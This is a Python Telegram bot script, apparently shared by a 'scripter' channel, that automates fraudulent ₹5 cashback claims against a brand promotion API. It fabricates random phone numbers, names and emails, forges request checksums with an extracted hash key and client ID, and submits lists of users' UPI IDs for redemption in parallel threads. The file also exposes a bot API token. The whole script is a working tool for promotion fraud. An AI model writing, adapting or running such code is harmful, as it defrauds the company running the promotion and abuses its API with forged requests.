import telebot
import requests
import random
import hashlib
import json
import threading
from concurrent.futures import ThreadPoolExecutor

# --- Configuration ---
API_TOKEN = '8095828135:AAFFmrU0Ze_0RJGNO9g2iO3jbYNp-t_BGeU'
CHANNEL_ID = '@Dragon_Scripterr' 
bot = telebot.TeleBot(API_TOKEN)

# Speed badhane ke liye workers (15-20 best hai)
MAX_WORKERS = 15 

HASH_KEY = "*dkaSDs#*k9487ld!*kaSJDsj9784@ADS@197dsk!!dHD@dka267#SD!sk192@"
CLIENT_ID = "LKnVCeozqpO9CIsMXW0yzHjkUFl4Njzh23qWAc9c2vg="
BASE_URL = "https://web.myfidelity.in/api/v1/parachute"

def check_join(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
        return False
    except Exception:
        return False

def gen_checksum(data_json, hash_key):
    s_hash = hashlib.sha256(hash_key.encode()).hexdigest()
    sorted_json = json.dumps(json.loads(data_json), separators=(',', ':'), sort_keys=True)
    combined = s_hash + sorted_json
    return hashlib.sha256(combined.encode()).hexdigest()

def process_boost(upi_id, chat_id):
    try:
        num = str(random.randint(6, 9)) + str(random.randint(100000000, 999999999))
        fname = random.choice(["Aarav","Aryan","Aditya","Amit","Ankit","Rahul","Sahil"])
        email = f"{fname.lower()}{random.randint(1000, 9999)}@gmail.com"
        
        headers = {
            "Content-Type": "application/json",
            "msisdn": num,
            "clientId": CLIENT_ID,
            "appName": "Merico_Parachute",
            "appVersion": "1.0",
            "channel": "WEB",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7)"
        }

        # Registration
        d1 = json.dumps({"msisdn": num, "firstName": fname, "lastName": "", "email": email, "pinCode": "", "consent1": 1, "ssoId": "NA"})
        headers["checksum"] = gen_checksum(d1, HASH_KEY)
        requests.post(f"{BASE_URL}/save-user-detail", data=d1, headers=headers, timeout=5)

        # Submit UPI
        d3 = json.dumps({"vpa": upi_id.strip()})
        headers["checksum"] = gen_checksum(d3, HASH_KEY)
        resp = requests.post(f"{BASE_URL}/save-upi-info", data=d3, headers=headers, timeout=5).json()

        if resp.get('status') == 'SUCCESS':
            d4 = json.dumps({"redemptionType": "CASHBACK"})
            headers["checksum"] = gen_checksum(d4, HASH_KEY)
            final = requests.post(f"{BASE_URL}/redemption", data=d4, headers=headers, timeout=5).json()
            bot.send_message(chat_id, f"✅ SUCCESS: {upi_id}\nResponse: {final.get('msg', 'Sent')}")
        else:
            bot.send_message(chat_id, f"❌ FAILED: {upi_id}\nReason: {resp.get('msg', 'Limit')}")
    except:
        pass

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, f"🚀 ₹5 Booster Active!\n\nJoin: {CHANNEL_ID}\n\nJoin karne ke baad UPI list bhejein.")

@bot.message_handler(func=lambda message: True)
def handle_upi(message):
    # Join Check
    if not check_join(message.from_user.id):
        markup = telebot.types.InlineKeyboardMarkup()
        btn = telebot.types.InlineKeyboardButton("Join Channel", url="https://t.me/Dragon_Scripterr")
        markup.add(btn)
        bot.reply_to(message, "❌ Pehle channel join karein!", reply_markup=markup)
        return

    upi_list = [x.strip() for x in message.text.split("\n") if x.strip()]
    bot.reply_to(message, f"⚡ Fast Boosting Started for {len(upi_list)} IDs...")
    
    # Fast parallel execution
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for upi in upi_list:
            executor.submit(process_boost, upi, message.chat.id)

print("Bot Status: High-Speed Mode Active...")
bot.infinity_polling()
